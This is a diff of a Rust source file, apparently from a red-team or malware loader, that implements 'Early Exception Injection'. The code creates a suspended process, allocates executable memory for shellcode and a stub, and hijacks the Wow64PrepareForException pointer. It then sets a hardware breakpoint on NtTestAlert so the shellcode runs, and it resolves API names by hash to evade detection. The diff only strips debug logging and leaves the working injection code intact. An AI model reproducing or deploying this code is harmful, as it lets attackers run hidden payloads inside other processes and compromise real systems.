@@ -16,37 +16,19 @@ const NT_TEST_ALERT_HASH: u32 = crate::dbj2_hash!(b"NtTestAlert");
 
 #[cfg(feature = "run_early_exception_inject")]
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("Starting Early Exception Injection...");
-
     let ntdll = get_loaded_module_by_hash(NTDLL_HASH).ok_or("Failed to get ntdll")?;
     let wow64_prepare_for_exception = wow64::return_wow64_function_pointer(ntdll as *mut u8).ok_or("Failed to find Wow64PrepareForException")?;
     
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("Wow64PrepareForException pointer: {:p}", wow64_prepare_for_exception));
-
     let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
-
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("Process created. PID: {}, TID: {}", process_info.dwProcessId, process_info.dwThreadId));
 
     // Allocate memory for shellcode
     use crate::api::PAGE_EXECUTE_READWRITE;
     let shellcode_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, shellcode_len, PAGE_EXECUTE_READWRITE)?;
 
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("Shellcode allocated at: {:#x}", shellcode_addr));
-
     // Allocate memory for stub
     let stub_data = stub::get_stub();
     let stub_size = stub_data.len();
     let stub_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, stub_size, PAGE_EXECUTE_READWRITE)?;
-
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("Stub allocated at: {:#x}", stub_addr));
-
-    // Prepare stub
-    let mut stub_data = stub_data;
     let nt_protect_addr = get_export_by_hash(ntdll, NT_PROTECT_HASH).ok_or("NtProtectVirtualMemory not found")?;
     
     // Patch stub
@@ -66,9 +48,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     let stub_addr_bytes = (stub_addr as usize).to_le_bytes();
     crate::api::write_virtual_memory(process_info.hProcess, wow64_prepare_for_exception as usize, &stub_addr_bytes)?;
 
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("Wow64PrepareForException pointer overwritten.");
-
     // Trigger exception via HWBP
     let nt_test_alert_addr = get_export_by_hash(ntdll, NT_TEST_ALERT_HASH).ok_or("NtTestAlert not found")?;
     
@@ -79,13 +58,7 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     
     crate::api::set_context_thread(process_info.hThread, &context as *const _ as *const c_void)?;
 
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("HWBP set on NtTestAlert.");
-
     crate::api::resume_thread(process_info.hThread)?;
-
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("Thread resumed.");
 
     Ok(())
 }
